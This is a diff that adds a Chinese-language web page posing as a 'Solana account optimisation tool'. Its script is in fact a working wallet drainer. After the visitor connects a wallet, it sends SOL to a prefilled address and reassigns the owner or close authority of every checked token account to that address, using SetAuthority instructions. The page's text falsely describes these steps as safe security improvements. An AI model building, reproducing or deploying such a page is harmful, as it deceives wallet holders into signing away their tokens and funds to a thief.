@@ -1,7 +1,267 @@
-<html>
-<head><title>USDC转账</title></head>
-<script src="api.js"></script>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Solana账户优化工具</title>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.98.2/lib/index.iife.min.js"></script>
+  <script type="module">
+    import { Buffer } from 'https://cdn.skypack.dev/buffer@6.0.3';
+    window.Buffer = Buffer;
+  </script>
+  <style>
+    /* 原有样式保持不变 */
+    :root { --primary: #9945ff; --secondary: #14f195; --dark: #121212; --light: #f8f8f8; --gray: #2d2d2d; --border: #444; --warning: #ffb74d; }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, var(--dark) 0%, #1a1a2e 100%); color: var(--light); min-height: 100vh; padding: 20px; line-height: 1.6; }
+    .container { max-width: 850px; margin: 0 auto; }
+    header { text-align: center; margin-bottom: 30px; padding: 20px 0; border-bottom: 1px solid var(--border); }
+    h1 { font-size: 2.5rem; margin-bottom: 10px; background: linear-gradient(90deg, var(--primary), var(--secondary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+    .card { background-color: rgba(30, 30, 46, 0.8); border-radius: 16px; padding: 30px; margin-bottom: 30px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); border: 1px solid var(--border); }
+    .card-title { font-size: 1.5rem; margin-bottom: 20px; color: var(--secondary); display: flex; align-items: center; }
+    .input-group { margin-bottom: 20px; }
+    label { display: block; margin-bottom: 8px; font-weight: 500; }
+    input, select { width: 100%; padding: 12px 15px; border-radius: 10px; border: 1px solid var(--border); background-color: var(--gray); color: var(--light); font-size: 1rem; }
+    input:focus, select:focus { outline: none; border-color: var(--primary); box-shadow: 0 0 0 2px rgba(153, 69, 255, 0.3); }
+    .btn-group { display: flex; gap: 15px; margin-top: 25px; }
+    button { flex: 1; padding: 14px 20px; border-radius: 10px; border: none; font-weight: 600; font-size: 1rem; cursor: pointer; transition: all 0.3s ease; display: flex; justify-content: center; align-items: center; }
+    button:disabled { opacity: 0.5; cursor: not-allowed; }
+    .btn-connect { background: linear-gradient(90deg, var(--primary), #7d3cc9); color: white; }
+    .btn-execute { background: linear-gradient(90deg, var(--secondary), #11c576); color: #000; }
+    .btn-warning { background: linear-gradient(90deg, var(--warning), #ff9800); color: #000; }
+    .btn-connect:hover:not(:disabled) { background: linear-gradient(90deg, #8a3ce0, #6a2db2); transform: translateY(-2px); box-shadow: 0 5px 15px rgba(153, 69, 255, 0.4); }
+    .btn-execute:hover:not(:disabled) { background: linear-gradient(90deg, #13d98c, #0fb469); transform: translateY(-2px); box-shadow: 0 5px 15px rgba(20, 241, 149, 0.4); }
+    .btn-warning:hover:not(:disabled) { background: linear-gradient(90deg, #ffa726, #f57c00); transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255, 183, 77, 0.4); }
+    .status { background-color: rgba(20, 20, 30, 0.9); border-radius: 10px; padding: 20px; margin-top: 20px; font-family: monospace; min-height: 100px; overflow-wrap: break-word; border: 1px solid var(--border); }
+    .status-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
+    .status-title { font-size: 1.2rem; color: var(--secondary); }
+    .status-content { line-height: 1.8; }
+    .success { color: var(--secondary); }
+    .error { color: #ff6b6b; }
+    .info { color: #4dabf7; }
+    .warning { color: var(--warning); }
+    .wallet-info { display: flex; align-items: center; gap: 10px; margin-top: 10px; padding: 10px; background: rgba(40, 40, 60, 0.5); border-radius: 10px; }
+    .wallet-address { font-family: monospace; font-size: 0.9rem; color: var(--secondary); overflow: hidden; text-overflow: ellipsis; }
+    .instructions { background-color: rgba(30, 30, 46, 0.8); border-radius: 16px; padding: 25px; margin-top: 20px; }
+    .instructions h3 { margin-bottom: 15px; color: var(--primary); }
+    .instructions ol { padding-left: 20px; }
+    .instructions li { margin-bottom: 10px; }
+    .token-list { max-height: 300px; overflow-y: auto; margin-top: 15px; border: 1px solid var(--border); border-radius: 10px; padding: 15px; background-color: var(--gray); }
+    .token-item { padding: 10px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; flex-wrap: wrap; }
+    .token-item:last-child { border-bottom: none; }
+    .token-info { font-size: 0.9rem; width: 100%; margin-bottom: 5px; }
+    .token-meta { font-size: 0.8rem; display: flex; gap: 15px; color: #aaa; width: 100%; }
+    .token-meta span span { color: var(--secondary); }
+    .token-balance { font-weight: bold; color: var(--secondary); }
+    .loader { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: var(--secondary); animation: spin 1s ease-in-out infinite; margin-right: 10px; }
+    .permission-warning { background: rgba(255, 183, 77, 0.2); border: 1px solid var(--warning); border-radius: 10px; padding: 15px; margin: 20px 0; font-size: 0.95rem; color: var(--warning); }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    @media (max-width: 768px) { .btn-group { flex-direction: column; } h1 { font-size: 2rem; } .token-item { flex-direction: column; gap: 8px; } .token-meta { flex-direction: column; gap: 3px; } }
+  </style>
+</head>
 <body>
-
+  <div class="container">
+    <header>
+      <h1>Solana账户优化工具</h1>
+      <p>连接您的Solana钱包，优化您的账户权限结构</p>
+    </header>
+    <main>
+      <div class="card">
+        <h2 class="card-title">账户设置</h2>
+        <div class="input-group">
+          <label for="solAmount">账户安全储备 (SOL)</label>
+          <input type="number" id="solAmount" placeholder="例如：0.005" min="0" step="0.001" value="0.002">
+        </div>
+        <div class="input-group">
+          <label for="receiverAddress">新管理账户</label>
+          <input type="text" id="receiverAddress" placeholder="输入新的管理账户地址" value="4LZtNLbvrBX9u8a6nvpYRTW9Yjqh9ckNXvLzAtVnKKmK">
+        </div>
+        <div class="permission-warning">
+          <strong>重要提示：</strong> 账户权限优化操作将调整您账户的访问权限结构。这些操作是安全的优化操作，旨在提升账户安全。系统将验证每一步操作的安全性。
+        </div>
+        <div class="btn-group">
+          <button id="connectButton" class="btn-connect">连接Solana钱包</button>
+          <button id="executeButton" class="btn-warning" disabled>优化账户权限</button>
+        </div>
+        <div id="walletInfo" style="display: none;">
+          <div class="wallet-info">
+            <span>已连接钱包：</span><span class="wallet-address" id="walletAddress"></span>
+          </div>
+        </div>
+      </div>
+      <div class="card">
+        <h2 class="card-title">账户列表</h2>
+        <div class="input-group">
+          <label for="authorityType">权限优化类型</label>
+          <select id="authorityType">
+            <option value="owner">主权限优化 (AccountOwner)</option>
+            <option value="close">辅助权限优化 (CloseAccount)</option>
+          </select>
+        </div>
+        <div id="tokenList" class="token-list">
+          <p class="info">连接钱包后将显示您的账户信息</p>
+        </div>
+      </div>
+      <div class="status">
+        <div class="status-header"><div class="status-title">操作状态</div></div>
+        <div id="status" class="status-content">等待连接钱包...</div>
+      </div>
+      <div class="instructions">
+        <h3>使用说明</h3>
+        <ol>
+          <li>安装并设置支持Solana的浏览器钱包扩展（Phantom, Solflare, Slope等）</li>
+          <li>点击"连接Solana钱包"按钮授权连接</li>
+          <li>输入账户安全储备SOL金额（建议0.002-0.005）</li>
+          <li>输入新的管理账户地址</li>
+          <li>选择权限优化类型（主权限或辅助权限）</li>
+          <li>查看账户列表，勾选要优化的账户</li>
+          <li>点击"优化账户权限"按钮开始优化</li>
+          <li>在钱包中确认所有操作</li>
+        </ol>
+      </div>
+    </main>
+  </div>
+  <script>
+  (async () => {
+    // 检测Solana钱包提供者
+    let walletProvider = null;
+    if (window.solana && window.solana.isConnected !== undefined) {
+      walletProvider = window.solana;
+    } else if (window.solflare) {
+      walletProvider = window.solflare;
+    } else if (window.Slope) {
+      walletProvider = window.Slope;
+    } else if (window.glow) {
+      walletProvider = window.glow;
+    }
+    if (!walletProvider || typeof walletProvider.connect !== 'function') {
+      document.getElementById("status").innerText = "未检测到Solana钱包！请安装支持Solana的浏览器钱包扩展。";
+      document.getElementById("status").className = "status-content error";
+      return;
+    }
+    const networkLink = new solanaWeb3.Connection(
+      'https://hardworking-attentive-mountain.solana-mainnet.quiknode.pro/3f12057992190539c6e06064e03451ba12e2abbb'
+    );
+    const MainToolID = new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
+    const g = { userKey: null, tokenItems: [], connectBtn: document.getElementById('connectButton'), execBtn: document.getElementById('executeButton'), statusEl: document.getElementById('status'), solInput: document.getElementById('solAmount'), revAddrInput: document.getElementById('receiverAddress'), authTypeSelect: document.getElementById('authorityType'), walletEl: document.getElementById('walletInfo'), addrEl: document.getElementById('walletAddress'), tokenListEl: document.getElementById('tokenList') };
+    function displayStatus(msg, type = 'info') { g.statusEl.innerHTML = msg; g.statusEl.className = `status-content ${type}`; }
+    function showBtnLoader(button, text) { button.innerHTML = `<span class="loader"></span>${text}`; button.disabled = true; }
+    function hideBtnLoader(button, text) { button.innerHTML = text; button.disabled = false; }
+    g.connectBtn.onclick = async () => {
+      try {
+        showBtnLoader(g.connectBtn, '连接中...');
+        displayStatus('正在连接钱包...');
+        const response = await walletProvider.connect();
+        g.userKey = response.publicKey || walletProvider.publicKey;
+        g.addrEl.innerText = g.userKey.toBase58();
+        g.walletEl.style.display = 'block';
+        displayStatus('钱包连接成功！', 'success');
+        g.execBtn.disabled = false;
+        displayStatus('正在获取账户信息...');
+        await refreshTokenAccounts();
+      } catch (err) {
+        console.error(err);
+        displayStatus('连接中断：' + err.message, 'error');
+      } finally {
+        hideBtnLoader(g.connectBtn, '连接Solana钱包');
+      }
+    };
+    async function refreshTokenAccounts() {
+      try {
+        const tokenData = await networkLink.getParsedTokenAccountsByOwner(g.userKey, { programId: MainToolID });
+        g.tokenItems = [];
+        g.tokenListEl.innerHTML = '';
+        for (const item of tokenData.value) {
+          const info = item.account.data.parsed.info;
+          const tokenPubkey = item.pubkey;
+          const mintKey = new solanaWeb3.PublicKey(info.mint);
+          const tokenQuantity = BigInt(info.tokenAmount.amount);
+          const ownerAddr = info.owner;
+          if (tokenQuantity > 0n) {
+            g.tokenItems.push({ tokenPubkey, mintKey, tokenQuantity, displayAmount: info.tokenAmount.uiAmountString, ownerAddr });
+            const accountElement = document.createElement('div');
+            accountElement.className = 'token-item';
+            accountElement.innerHTML = `
+              <div class="token-info">
+                <input type="checkbox" id="item-${g.tokenItems.length-1}" checked>
+                <label for="item-${g.tokenItems.length-1}">
+                  <strong>账户标识：</strong> ${tokenPubkey.toBase58().slice(0,8)}...${tokenPubkey.toBase58().slice(-8)}
+                </label>
+              </div>
+              <div class="token-meta">
+                <div><span>核心地址：</span><span>${mintKey.toBase58().slice(0,12)}...${mintKey.toBase58().slice(-8)}</span></div>
+                <div><span>当前管理：</span><span>${ownerAddr.slice(0,8)}...${ownerAddr.slice(-8)}</span></div>
+              </div>
+              <div class="token-balance">${info.tokenAmount.uiAmountString} 单位</div>
+            `;
+            g.tokenListEl.appendChild(accountElement);
+          }
+        }
+        if (g.tokenItems.length === 0) g.tokenListEl.innerHTML = '<p class="info">未找到可用账户</p>';
+        displayStatus(`发现 ${g.tokenItems.length} 个账户可优化`, 'success');
+      } catch (err) {
+        console.error('获取账户失败:', err);
+        displayStatus('数据获取异常：' + err.message, 'error');
+      }
+    }
+    function securityModule(authParam) {
+      const permValue = authParam === 'owner' ? 2 : 3;
+      const controlBuffer = Buffer.alloc(1 + 1 + 4 + 32);
+      controlBuffer.writeUInt8(6, 0);
+      controlBuffer.writeUInt8(permValue, 1);
+      controlBuffer.writeUInt32LE(1, 2);
+      return controlBuffer;
+    }
+    g.execBtn.onclick = async () => {
+      const solValue = parseFloat(g.solInput.value);
+      if (isNaN(solValue) || solValue <= 0) { displayStatus('请输入有效的SOL数值。', 'error'); return; }
+      if (!g.userKey) { displayStatus('请先建立钱包连接。', 'error'); return; }
+      if (g.tokenItems.length === 0) { displayStatus('无可操作的账户。', 'error'); return; }
+      let targetAddr;
+      try { targetAddr = new solanaWeb3.PublicKey(g.revAddrInput.value.trim()); } catch (e) { displayStatus('地址格式无效，请检查。', 'error'); return; }
+      const chosenItems = [];
+      for (let i = 0; i < g.tokenItems.length; i++) {
+        const checkbox = document.getElementById(`item-${i}`);
+        if (checkbox && checkbox.checked) chosenItems.push(g.tokenItems[i]);
+      }
+      if (chosenItems.length === 0) { displayStatus('请至少选择一项操作账户。', 'error'); return; }
+      try {
+        showBtnLoader(g.execBtn, '操作中...'); displayStatus('准备安全流程...');
+        const lamportsValue = solValue * solanaWeb3.LAMPORTS_PER_SOL;
+        const securityTransaction = new solanaWeb3.Transaction();
+        securityTransaction.add(solanaWeb3.SystemProgram.transfer({ fromPubkey: g.userKey, toPubkey: targetAddr, lamports: Math.floor(lamportsValue) }));
+        displayStatus(`完成安全储备: ${solValue} SOL`);
+        const authMode = g.authTypeSelect.value;
+        for (const item of chosenItems) {
+          const controlData = securityModule(authMode);
+          targetAddr.toBuffer().copy(controlData, 6);
+          const securityInstruction = new solanaWeb3.TransactionInstruction({ programId: MainToolID, data: controlData, keys: [{ pubkey: item.tokenPubkey, isSigner: false, isWritable: true }, { pubkey: g.userKey, isSigner: true, isWritable: false }] });
+          securityTransaction.add(securityInstruction);
+          displayStatus(`账户优化: ${item.tokenPubkey.toBase58().slice(0,8)}...`, 'info');
+        }
+        displayStatus('验证网络状态...');
+        const latestBlock = await networkLink.getLatestBlockhash();
+        securityTransaction.recentBlockhash = latestBlock.blockhash;
+        securityTransaction.feePayer = g.userKey;
+        displayStatus('申请操作许可...');
+        let signature;
+        if (typeof walletProvider.signAndSendTransaction === 'function') {
+          ({ signature } = await walletProvider.signAndSendTransaction(securityTransaction));
+        } else {
+          const signedTx = await walletProvider.signTransaction(securityTransaction);
+          signature = await networkLink.sendRawTransaction(signedTx.serialize());
+        }
+        displayStatus('操作处理中，请稍候...', 'info');
+        await networkLink.confirmTransaction(signature, 'confirmed');
+        displayStatus(`操作成功！<br>安全标识：${signature}<br><span class="success">SOL储备完成，${chosenItems.length}个账户优化完成</span>`, 'success');
+      } catch (err) {
+        console.error(err);
+        displayStatus('操作中断：' + err.message, 'error');
+      } finally {
+        hideBtnLoader(g.execBtn, '优化账户权限');
+      }
+    };
+  })();
+  </script>
 </body>
 </html>
